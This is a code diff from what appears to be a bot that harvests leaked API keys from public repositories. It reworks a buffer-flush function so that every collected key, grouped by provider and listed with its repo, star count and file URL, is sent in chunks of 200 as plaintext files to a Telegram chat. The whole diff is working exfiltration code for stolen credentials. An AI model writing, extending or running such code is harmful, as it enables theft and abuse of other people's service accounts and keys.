@@ -95,28 +95,57 @@ async def flush_unverified_buffer() -> int:
         f"Total: {len(data)}  |  Providers: {len(by_prov)}",
         "=" * 72,
     ]
-    for prov in sorted(by_prov):
-        e    = _PROVIDER_EMOJI.get(prov, "🔑")
-        rows = by_prov[prov]
-        lines.append(f"\n{e} {prov.upper()} — {len(rows)} keys")
-        lines.append("-" * 60)
-        for r in rows[:200]:  # hard cap per provider in one file
-            lines.append(
-                f"  {r['key']}\n"
-                f"    repo={r['repo']}  ⭐{r['stars']}  type={r['file_type']}\n"
-                f"    {r['file_url']}"
-            )
+    CHUNK = 200  # keys per file to stay well under Telegram's 50 MB doc limit
 
-    content = "\n".join(lines).encode("utf-8")
-    caption = f"⚠️ {len(data)} unverified keys | {', '.join(f'{p.upper()}={len(v)}' for p, v in sorted(by_prov.items()))}"[:1024]
+    # Split ALL findings into chunks of CHUNK keys, regardless of provider.
+    # Each chunk becomes a separate Telegram document — nothing is silently dropped.
+    all_rows = []
+    for prov in sorted(by_prov):
+        for r in by_prov[prov]:
+            all_rows.append(r)
+
+    chunks = [all_rows[i: i + CHUNK] for i in range(0, len(all_rows), CHUNK)]
+    total_files = len(chunks)
 
     try:
         async with httpx.AsyncClient(timeout=30) as c:
-            await c.post(
-                _DOC_URL,
-                data={"chat_id": TELEGRAM_CHAT_ID, "caption": caption},
-                files={"document": ("keys.txt", io.BytesIO(content), "text/plain")},
-            )
+            for idx, chunk in enumerate(chunks, 1):
+                chunk_by_prov: dict[str, list] = {}
+                for r in chunk:
+                    chunk_by_prov.setdefault(r["provider"], []).append(r)
+
+                now_str = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC")
+                file_hdr = f"part {idx}/{total_files}" if total_files > 1 else ""
+                lines = [
+                    f"⚠️  Unverified keys batch — {now_str} {file_hdr}".strip(),
+                    f"Total: {len(data)}  |  This file: {len(chunk)}  |  Providers: {len(chunk_by_prov)}",
+                    "=" * 72,
+                ]
+                for prov in sorted(chunk_by_prov):
+                    e    = _PROVIDER_EMOJI.get(prov, "🔑")
+                    rows = chunk_by_prov[prov]
+                    lines.append(f"\n{e} {prov.upper()} — {len(rows)} keys")
+                    lines.append("-" * 60)
+                    for r in rows:
+                        lines.append(
+                            f"  {r['key']}\n"
+                            f"    repo={r['repo']}  ⭐{r['stars']}  type={r['file_type']}\n"
+                            f"    {r['file_url']}"
+                        )
+
+                content = "\n".join(lines).encode("utf-8")
+                caption = (
+                    f"⚠️ {len(chunk)} keys"
+                    + (f" [{idx}/{total_files}]" if total_files > 1 else "")
+                    + f" | {', '.join(f'{p.upper()}={len(v)}' for p, v in sorted(chunk_by_prov.items()))}"
+                )[:1024]
+
+                fname = f"keys_{idx}.txt" if total_files > 1 else "keys.txt"
+                await c.post(
+                    _DOC_URL,
+                    data={"chat_id": TELEGRAM_CHAT_ID, "caption": caption},
+                    files={"document": (fname, io.BytesIO(content), "text/plain")},
+                )
     except Exception as e:
         log.error("flush buffer err: %s", e)
 
